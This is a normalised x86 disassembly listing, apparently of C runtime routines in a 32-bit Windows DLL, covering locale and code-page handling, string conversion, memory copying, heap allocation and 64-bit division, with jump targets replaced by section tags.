mov edi eax
call sub_100200e0
pop ecx
cmp edi eax
pop edi
je r-xdata
sub_1002f975
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
call sub_10027e84
mov esi eax
mov edx edi
add esi 0x9c
call sub_1002f81a
mov ebx [ GetLocaleInfoA@IAT ]
mov edi eax
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x14 ]
neg eax
sbb eax eax
and eax 0xfffff005
add eax 0x1002
push eax
push edi
call ebx
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi + 0x4 ]
call sub_10033895
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ esi + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
mov ecx [ esi + 0x8 ]
mov eax 0x300
and ecx eax
cmp ecx eax
je r-xdata
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x10 ]
neg eax
sbb eax eax
and eax 0xfffff002
add eax 0x1001
push eax
push edi
call ebx
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10020040
leave
retn 0x4
mov eax [ esi + 0x8 ]
shr eax 0x2
not eax
and eax 0x1
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x10 ]
neg eax
sbb eax eax
and eax 0xfffff002
add eax 0x1001
push eax
push edi
call ebx
test eax eax
je r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_10033895
pop ecx
pop ecx
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_10033895
pop ecx
xor ebx ebx
pop ecx
test eax eax
jne r-xdata
test [ esi + 0x8 ] 0x2
jne r-xdata
or [ esi + 0x8 ] 0x304
mov [ esi + 0x18 ] edi
jmp r-xdata
cmp [ esi + 0x10 ] ebx
jne r-xdata
or [ esi + 0x8 ] 0x200
mov eax [ esi + 0x8 ]
cmp [ esi + 0x10 ] ebx
je r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
mov [ esi + 0x1c ] edi
cmp [ esi + 0xc ] ebx
je r-xdata
cmp [ esi + 0xc ] ebx
je r-xdata
or eax 0x100
mov [ esi + 0x8 ] eax
jmp r-xdata
mov edx [ esi + 0x8 ]
test dl 0x1
jne r-xdata
push eax
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_100339ef
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_10033895
pop ecx
pop ecx
test eax eax
jne r-xdata
or [ esi + 0x8 ] 0x100
push [ esi ]
call sub_100200e0
pop ecx
cmp eax [ esi + 0xc ]
jne r-xdata
cmp [ esi + 0x18 ] ebx
jne r-xdata
push edi
call sub_1002f7f6
pop ecx
test eax eax
je r-xdata
push [ esi ]
or [ esi + 0x8 ] 0x2
mov [ esi + 0x1c ] edi
call sub_100200e0
pop ecx
cmp eax [ esi + 0xc ]
jne r-xdata
push ebx
mov [ esi + 0x18 ] edi
push 0x1
jmp r-xdata
or edx 0x1
mov [ esi + 0x8 ] edx
mov [ esi + 0x18 ] edi
jmp r-xdata
push edi
mov ecx esi
call sub_1002f901
pop ecx
pop ecx
test eax eax
je r-xdata
sub_1002fb47
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
mov edi [ ebp + 0x8 ]
call sub_10027e84
mov esi eax
mov edx edi
add esi 0x9c
call sub_1002f81a
mov edi eax
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x10 ]
neg eax
sbb eax eax
and eax 0xfffff002
add eax 0x1001
push eax
push edi
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_10033895
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ esi + 0x8 ] eax
inc eax
jmp r-xdata
cmp [ esi + 0x10 ] 0x0
jne r-xdata
cmp [ esi + 0x10 ] eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_10020040
leave
retn 0x4
mov eax [ esi + 0x8 ]
shr eax 0x2
not eax
and eax 0x1
cmp [ esi + 0xc ] 0x0
je r-xdata
or [ esi + 0x8 ] 0x4
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
push 0x1
jmp r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_10033895
pop ecx
pop ecx
test eax eax
jne r-xdata
push edi
mov ecx esi
call sub_1002f901
pop ecx
pop ecx
test eax eax
je r-xdata
push eax
sub_1002fc08
push [ esi ]
call sub_100200e0
push [ esi + 0x4 ]
sub eax 0x3
neg eax
sbb eax eax
inc eax
mov [ esi + 0x10 ] eax
call sub_100200e0
sub eax 0x3
neg eax
sbb eax eax
and [ esi + 0x18 ] 0x0
inc eax
cmp [ esi + 0x10 ] 0x0
pop ecx
pop ecx
mov [ esi + 0x14 ] eax
je r-xdata
mov edx [ esi ]
call sub_1002f84e
push 0x2
pop eax
jmp r-xdata
and [ esi + 0x8 ] 0x0
test eax 0x200
je r-xdata
push 0x1
push sub_1002f975
mov [ esi + 0xc ] eax
call [ EnumSystemLocalesA@IAT ]
mov eax [ esi + 0x8 ]
test eax 0x100
je r-xdata
test al 0x7
jne r-xdata
retn
sub_1002fc6f
push [ esi ]
call sub_100200e0
sub eax 0x3
neg eax
sbb eax eax
inc eax
pop ecx
mov [ esi + 0x10 ] eax
je r-xdata
mov edx [ esi ]
call sub_1002f84e
push 0x2
pop eax
jmp r-xdata
retn
and [ esi + 0x8 ] 0x0
push 0x1
push sub_1002fb47
mov [ esi + 0xc ] eax
call [ EnumSystemLocalesA@IAT ]
test [ esi + 0x8 ] 0x4
jne r-xdata
sub_1002fcab
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
call sub_10027e84
mov ebx [ ebp + 0x8 ]
mov esi eax
add esi 0x9c
test ebx ebx
jne r-xdata
lea eax [ ebx + 0x40 ]
lea edi [ esi + 0x4 ]
mov [ esi ] ebx
mov [ edi ] eax
test eax eax
je r-xdata
or [ esi + 0x8 ] 0x104
jmp r-xdata
mov eax [ esi ]
and [ esi + 0x8 ] 0x0
test eax eax
je r-xdata
cmp [ eax ] 0x0
je r-xdata
call [ GetUserDefaultLCID@IAT ]
mov [ esi + 0x18 ] eax
mov [ esi + 0x1c ] eax
mov edi [ edi ]
test edi edi
je r-xdata
cmp [ eax ] 0x0
je r-xdata
push edi
push 0x16
push r--data
call sub_1002f6f0
add esp 0xc
xor eax eax
mov ecx ebx
sub ebx 0xffffff80
neg ecx
sbb ecx ecx
and ecx ebx
mov edi esi
call sub_1002f752
mov edi eax
mov [ ebp + 0x8 ] edi
test edi edi
je r-xdata
mov [ esi + 0x8 ] 0x104
cmp [ edi ] 0x0
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
cmp edi 0xfde8
je r-xdata
push edi
call sub_100200e0
sub eax 0x3
neg eax
pop ecx
sbb eax eax
push 0x1
inc eax
push sub_1002f869
mov [ esi + 0x14 ] eax
call [ EnumSystemLocalesA@IAT ]
test [ esi + 0x8 ] 0x4
jne r-xdata
call sub_1002fc6f
cmp [ eax ] 0x0
je r-xdata
cmp edi 0xfde9
je r-xdata
cmp [ esi + 0x8 ] 0x0
je r-xdata
and [ esi + 0x8 ] 0x0
jmp r-xdata
push esi
push 0x40
push r--data
call sub_1002f6f0
add esp 0xc
test eax eax
je r-xdata
call sub_1002fc08
jmp r-xdata
movzx eax di
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
mov edi [ edi ]
test edi edi
je r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
push 0x1
push [ esi + 0x18 ]
call [ IsValidLocale@IAT ]
test eax eax
je r-xdata
call sub_1002fc6f
jmp r-xdata
cmp [ edi ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
call sub_1002fc08
jmp r-xdata
mov ebx [ ebp + 0x10 ]
test ebx ebx
je r-xdata
mov cx [ esi + 0x18 ]
mov [ eax ] cx
mov cx [ esi + 0x1c ]
mov [ eax + 0x2 ] cx
mov [ eax + 0x4 ] di
xor eax eax
inc eax
jmp r-xdata
mov edi [ GetLocaleInfoA@IAT ]
mov ecx 0x814
cmp [ eax ] cx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push 0x40
push ebx
push 0x1001
push [ esi + 0x18 ]
call edi
test eax eax
je r-xdata
push r--data
push 0x40
push ebx
call sub_1002776c
add esp 0xc
test eax eax
je r-xdata
push 0x40
lea eax [ ebx + 0x40 ]
push eax
push 0x1002
push [ esi + 0x1c ]
call edi
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_10020451
add esp 0x14
jmp r-xdata
push 0xa
push 0x10
sub ebx 0xffffff80
push ebx
push [ ebp + 0x8 ]
call sub_10026eb3
add esp 0x10
sub_1002fe9c
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
push ebx
push esi
xor ebx ebx
push edi
mov edi ecx
cmp eax ebx
jne r-xdata
cmp eax 0x2
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
xor esi esi
inc esi
push esi
push r--data
push esi
call [ GetStringTypeW@IAT ]
test eax eax
je r-xdata
xor esi esi
cmp [ ebp + 0x1c ] ebx
jne r-xdata
cmp eax ebx
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] esi
jmp r-xdata
cmp [ ebp + 0x18 ] ebx
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x14 ]
mov [ ebp + 0x1c ] eax
cmp eax 0x1
jne r-xdata
mov eax [ rw-data ]
push 0x2
pop eax
mov [ rw-data ] eax
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x18 ] ebx
jne r-xdata
push [ ebp + 0x1c ]
call sub_100301a0
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x18 ] eax
xor eax eax
jmp r-xdata
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x20 ] ebx
push ebx
push ebx
push [ ebp + 0x10 ]
setne al
push [ ebp + 0xc ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x18 ]
call esi
mov edi eax
cmp edi ebx
je r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x18 ] eax
cmp eax [ ebp + 0x18 ]
je r-xdata
lea esp [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10020040
leave
retn
jle r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x1c ]
call [ GetStringTypeA@IAT ]
mov edi eax
cmp esi ebx
je r-xdata
push ebx
push ebx
lea ecx [ ebp + 0x10 ]
push ecx
push [ ebp + 0xc ]
push eax
push [ ebp + 0x18 ]
call sub_100301e9
mov esi eax
add esp 0x18
cmp esi ebx
je r-xdata
test ebx ebx
je r-xdata
cmp edi 0x7ffffff0
ja r-xdata
mov eax edi
push esi
call sub_100207fd
pop ecx
mov [ ebp + 0xc ] esi
lea eax [ edi + edi ]
push eax
push 0x0
push ebx
call sub_100209e0
add esp 0xc
push edi
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0x1
push [ ebp + 0x18 ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push ebx
call sub_10026507
mov eax [ ebp - 0x8 ]
pop ecx
jmp r-xdata
push [ ebp + 0x14 ]
push eax
push ebx
push [ ebp + 0x8 ]
call [ GetStringTypeW@IAT ]
mov [ ebp - 0x8 ] eax
push eax
call sub_10022f32
pop ecx
cmp eax ebx
je r-xdata
call sub_100303a0
mov eax esp
cmp eax ebx
je r-xdata
mov ebx eax
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
add eax 0x8
sub_10030056
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_10023358
push [ ebp + 0x24 ]
lea ecx [ ebp - 0x10 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_1002fe9c
add esp 0x1c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_10030098
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push ebx
mov ebx [ ebp + 0x10 ]
test ebx ebx
jne r-xdata
push edi
cmp ebx 0x4
jb r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
jmp r-xdata
lea edi [ ebx - 0x4 ]
test edi edi
jbe r-xdata
pop ebx
leave
retn
cmp [ ebp - 0x4 ] ebx
jb r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov dl [ eax ]
test dl dl
je r-xdata
xor eax eax
movzx eax [ eax - 0x4 ]
movzx ecx [ ecx - 0x4 ]
jmp r-xdata
cmp dl [ ecx - 0x4 ]
jne r-xdata
movzx eax [ eax ]
movzx ecx [ ecx ]
cmp dl [ ecx ]
jne r-xdata
sub eax ecx
jmp r-xdata
mov dl [ eax - 0x3 ]
test dl dl
je r-xdata
pop edi
inc eax
inc ecx
inc [ ebp - 0x4 ]
movzx eax [ eax - 0x3 ]
movzx ecx [ ecx - 0x3 ]
jmp r-xdata
cmp dl [ ecx - 0x3 ]
jne r-xdata
mov dl [ eax - 0x2 ]
test dl dl
je r-xdata
movzx eax [ eax - 0x2 ]
movzx ecx [ ecx - 0x2 ]
jmp r-xdata
cmp dl [ ecx - 0x2 ]
jne r-xdata
mov dl [ eax - 0x1 ]
test dl dl
je r-xdata
movzx eax [ eax - 0x1 ]
movzx ecx [ ecx - 0x1 ]
jmp r-xdata
cmp dl [ ecx - 0x1 ]
jne r-xdata
add [ ebp - 0x4 ] 0x4
cmp [ ebp - 0x4 ] edi
jb r-xdata
mov dl [ eax ]
add eax 0x4
add ecx 0x4
test dl dl
je r-xdata
jmp r-xdata
sub_10030160
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
mov edi edi
add edx 0x1
bts [ esp ] eax
jmp r-xdata
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
mov al [ esi ]
or al al
je r-xdata
lea eax [ esi - 0x1 ]
sub_100301a0
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push 0x6
lea eax [ ebp - 0xc ]
push eax
push 0x1004
push [ ebp + 0x8 ]
mov [ ebp - 0x6 ] 0x0
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
call sub_100338e7
pop ecx
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10020040
leave
retn
sub_100301e9
mov edi edi
push ebp
mov ebp esp
sub esp 0x34
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x18 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x14 ]
push ebx
mov [ ebp - 0x30 ] eax
mov eax [ eax ]
push esi
mov [ ebp - 0x24 ] eax
mov eax [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x2c ] edi
cmp eax [ ebp + 0xc ]
je r-xdata
mov eax [ ebp - 0x20 ]
mov esi [ GetCPInfo@IAT ]
lea ecx [ ebp - 0x18 ]
push ecx
push eax
call esi
mov ebx [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
push edi
push edi
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
push 0x1
push [ ebp + 0x8 ]
call ebx
mov esi eax
cmp esi edi
jne r-xdata
cmp [ ebp - 0x18 ] 0x1
jne r-xdata
jle r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
push [ ebp + 0xc ]
call esi
test eax eax
je r-xdata
mov [ ebp - 0x1c ] edi
cmp esi 0x7ffffff0
ja r-xdata
lea esp [ ebp - 0x40 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10020040
leave
retn
cmp [ ebp - 0x18 ] 0x1
jne r-xdata
lea eax [ esi + esi ]
push eax
push edi
push [ ebp - 0x1c ]
call sub_100209e0
add esp 0xc
push esi
push [ ebp - 0x1c ]
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
push 0x1
push [ ebp + 0x8 ]
call ebx
test eax eax
je r-xdata
lea eax [ esi + esi + 0x8 ]
cmp eax 0x400
ja r-xdata
mov esi [ ebp - 0x24 ]
mov [ ebp - 0x2c ] 0x1
cmp esi 0xffffffff
jne r-xdata
push [ ebp - 0x1c ]
call sub_10026507
pop ecx
mov ebx [ ebp - 0x34 ]
cmp ebx edi
je r-xdata
push eax
call sub_10022f32
pop ecx
cmp eax edi
je r-xdata
call sub_100303a0
mov eax esp
cmp eax edi
je r-xdata
cmp esi edi
push [ ebp - 0x28 ]
call sub_100200e0
mov esi eax
pop ecx
inc esi
mov ebx [ WideCharToMultiByte@IAT ]
cmp [ ebp - 0x2c ] edi
jne r-xdata
push edi
push edi
push [ ebp + 0x1c ]
push ebx
push esi
push [ ebp - 0x1c ]
push edi
push [ ebp + 0xc ]
call [ WideCharToMultiByte@IAT ]
test eax eax
je r-xdata
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
push esi
push 0x1
call sub_10026cea
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax edi
je r-xdata
push edi
push edi
push edi
push edi
push esi
push [ ebp - 0x1c ]
push edi
push [ ebp + 0xc ]
call ebx
mov esi eax
cmp esi edi
je r-xdata
mov [ ebp - 0x20 ] ebx
jmp r-xdata
cmp [ ebp - 0x1c ] edi
je r-xdata
add eax 0x8
push edi
push edi
push esi
push eax
push esi
push [ ebp - 0x1c ]
push edi
push [ ebp + 0xc ]
call ebx
cmp eax edi
jne r-xdata
cmp [ ebp - 0x24 ] 0xffffffff
je r-xdata
push [ ebp - 0x20 ]
call sub_100207fd
pop ecx
mov [ ebp - 0x20 ] edi
jmp r-xdata
mov ecx [ ebp - 0x30 ]
mov [ ecx ] eax
sub_100303cc
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8 ] esi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
shr ecx 0x7
jmp r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec ecx
jne r-xdata
mov esi [ ebp - 0x8 ]
mov edi [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_10030453
push ebp
mov ebp esp
sub esp 0x1c
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] ebx
mov ebx [ ebp + 0xc ]
mov eax ebx
cdq
mov ecx eax
mov eax [ ebp + 0x8 ]
xor ecx edx
sub ecx edx
and ecx 0xf
xor ecx edx
sub ecx edx
cdq
mov edi eax
xor edi edx
sub edi edx
and edi 0xf
xor edi edx
sub edi edx
mov edx ecx
or edx edi
jne r-xdata
cmp ecx edi
jne r-xdata
mov esi [ ebp + 0x10 ]
mov ecx esi
and ecx 0x7f
mov [ ebp - 0x18 ] ecx
cmp esi ecx
je r-xdata
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
neg ecx
add ecx 0x10
mov [ ebp - 0x1c ] ecx
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp - 0x1c ]
[ edi ] [ esi ]
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x1c ]
mov edx [ ebp + 0xc ]
add edx [ ebp - 0x1c ]
mov eax [ ebp + 0x10 ]
sub eax [ ebp - 0x1c ]
push eax
push edx
push ecx
call sub_10030453
add esp 0xc
mov eax [ ebp + 0x8 ]
jmp r-xdata
test ecx ecx
je r-xdata
sub esi ecx
push esi
push ebx
push eax
call sub_100303cc
add esp 0xc
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x18 ]
mov ebx [ ebp - 0x4 ]
mov esi [ ebp - 0x8 ]
mov edi [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
mov ebx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
add edx ebx
sub edx ecx
mov [ ebp - 0x14 ] edx
add ebx eax
sub ebx ecx
mov [ ebp - 0x10 ] ebx
mov esi [ ebp - 0x14 ]
mov edi [ ebp - 0x10 ]
mov ecx [ ebp - 0x18 ]
[ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
jmp r-xdata
sub_10030536
push 0xc
push r--data
call sub_10028b48
mov ecx [ ebp + 0x8 ]
xor edi edi
cmp ecx edi
jbe r-xdata
imul ecx [ ebp + 0xc ]
mov esi ecx
mov [ ebp + 0x8 ] esi
cmp esi edi
jne r-xdata
push 0xffffffe0
pop eax
xor edx edx
div ecx
cmp eax [ ebp + 0xc ]
sbb eax eax
inc eax
jne r-xdata
xor ebx ebx
mov [ ebp - 0x1c ] ebx
cmp esi 0xffffffe0
ja r-xdata
xor esi esi
inc esi
call sub_10026065
mov [ eax ] 0xc
push edi
push edi
push edi
push edi
push edi
call sub_10020579
add esp 0x14
cmp ebx edi
jne r-xdata
cmp [ rw-data ] 0x3
jne r-xdata
call sub_10028b8d
retn
mov eax ebx
cmp [ rw-data ] edi
je r-xdata
cmp ebx edi
jne r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
mov eax [ ebp + 0x8 ]
cmp eax [ rw-data ]
ja r-xdata
cmp ebx edi
jne r-xdata
push esi
call sub_10027744
pop ecx
test eax eax
jne r-xdata
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov ebx eax
push 0x4
call sub_10028f4e
pop ecx
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
call sub_10029760
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10030632
mov ebx [ ebp - 0x1c ]
cmp ebx edi
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax edi
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax edi
je r-xdata
push [ ebp + 0x8 ]
push edi
push ebx
call sub_100209e0
add esp 0xc
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
mov [ eax ] 0xc
jmp r-xdata
sub_10030654
push 0x10
push r--data
call sub_10028b48
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push [ ebp + 0xc ]
call sub_10022f32
pop ecx
jmp r-xdata
cmp [ rw-data ] 0x3
jne r-xdata
push ebx
call sub_100207fd
pop ecx
jmp r-xdata
call sub_10028b8d
retn
cmp esi 0xffffffe0
jbe r-xdata
xor edi edi
mov [ ebp - 0x1c ] edi
cmp esi 0xffffffe0
ja r-xdata
xor eax eax
test esi esi
jne r-xdata
push esi
call sub_10027744
pop ecx
call sub_10026065
push 0x4
call sub_10028f4e
pop ecx
mov [ ebp - 0x4 ] edi
push ebx
call sub_10028f81
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax edi
je r-xdata
push esi
push ebx
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
inc esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10030798
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
cmp esi [ rw-data ]
ja r-xdata
mov eax edi
jmp r-xdata
cmp [ rw-data ] eax
je r-xdata
mov edi [ ebp - 0x1c ]
test esi esi
jne r-xdata
cmp [ ebp - 0x1c ] edi
jne r-xdata
push esi
push ebx
push eax
call sub_1002947f
add esp 0xc
test eax eax
je r-xdata
test edi edi
jne r-xdata
push esi
call sub_10027744
pop ecx
test eax eax
je r-xdata
cmp [ rw-data ] edi
je r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
push esi
push ebx
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov edi eax
jmp r-xdata
inc esi
cmp esi edi
jne r-xdata
push esi
call sub_10029760
pop ecx
mov [ ebp - 0x1c ] eax
cmp eax edi
je r-xdata
mov [ ebp - 0x1c ] ebx
jmp r-xdata
call sub_10026065
call sub_10026065
jmp r-xdata
test edi edi
jne r-xdata
push esi
call sub_10027744
pop ecx
test eax eax
jne r-xdata
test edi edi
jne r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
push esi
push edi
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov [ ebp - 0x1c ] eax
cmp eax edi
je r-xdata
xor esi esi
inc esi
mov [ ebp + 0xc ] esi
mov eax [ ebx - 0x4 ]
dec eax
cmp eax esi
jb r-xdata
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_10026023
pop ecx
mov [ esi ] eax
jmp r-xdata
call sub_10026065
cmp [ ebp - 0x20 ] edi
je r-xdata
call sub_10026065
cmp [ ebp - 0x20 ] edi
jne r-xdata
mov eax [ ebx - 0x4 ]
dec eax
cmp eax esi
jb r-xdata
push eax
push ebx
push [ ebp - 0x1c ]
call sub_10026940
push ebx
call sub_10028f81
mov [ ebp - 0x20 ] eax
push ebx
push eax
call sub_10028fb1
add esp 0x18
mov eax esi
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_10026023
mov [ esi ] eax
pop ecx
mov [ eax ] 0xc
jmp r-xdata
mov [ eax ] 0xc
push eax
push ebx
push [ ebp - 0x1c ]
call sub_10026940
push ebx
push [ ebp - 0x20 ]
call sub_10028fb1
add esp 0x14
mov eax esi
sub_1003086f
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
push ebx
xor ebx ebx
cmp ecx ebx
jbe r-xdata
imul ecx [ ebp + 0x10 ]
push esi
push edi
mov esi ecx
cmp [ ebp + 0x8 ] ebx
je r-xdata
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax [ ebp + 0x10 ]
jae r-xdata
push esi
push [ ebp + 0x8 ]
call sub_10030654
mov edi eax
pop ecx
pop ecx
test edi edi
je r-xdata
push [ ebp + 0x8 ]
call sub_1002d97e
pop ecx
mov ebx eax
call sub_10026065
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0xc
call sub_10020579
add esp 0x14
xor eax eax
jmp r-xdata
mov eax edi
pop edi
pop esi
cmp ebx esi
jae r-xdata
pop ebx
pop ebp
retn
sub esi ebx
push esi
push 0x0
add ebx edi
push ebx
call sub_100209e0
add esp 0xc
sub_100308f0
push esi
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x8 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x10 ]
mov ecx eax
mov eax esi
mul [ esp + 0x10 ]
add edx ecx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x14 ]
mov ecx eax
mov eax [ esp + 0x10 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
pop esi
retn 0x10
dec esi
